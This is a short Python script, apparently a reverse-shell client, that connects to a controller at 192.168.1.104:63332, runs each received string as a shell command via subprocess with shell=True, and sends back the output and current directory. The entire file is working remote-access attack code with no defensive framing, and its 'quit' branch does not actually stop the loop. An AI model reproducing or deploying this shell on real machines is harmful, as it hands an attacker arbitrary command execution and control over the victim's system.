
import os
import subprocess
import socket

s= socket.socket()
host = "192.168.1.104"
port= 63332

s.connect((host, port))

while True:
    data= s.recv(1024)
    if data[:2].decode("utf-8")== 'cd':
        os.chdir(data[3:].decode("utf-8"))
    if len(data)>0:
        if data.decode("utf-8") == 'quit':
            print("Connection Closed")
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                               stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        currentWD = os.getcwd() + '>'
        s.send(str.encode(output_str + currentWD))
        print(output_str)


        #hye everyone
